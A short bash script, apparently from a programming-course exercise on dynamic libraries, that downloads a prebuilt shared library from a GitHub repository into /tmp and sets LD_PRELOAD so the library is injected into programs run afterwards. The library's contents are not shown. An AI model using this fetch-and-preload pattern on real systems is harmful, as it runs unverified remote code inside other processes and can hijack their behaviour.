#!/bin/bash
wget -P /tmp https://github.com/A-fethi/alx-low_level_programming/raw/master/0x18-dynamic_libraries/inject.so
export LD_PRELOAD=/tmp/inject.so
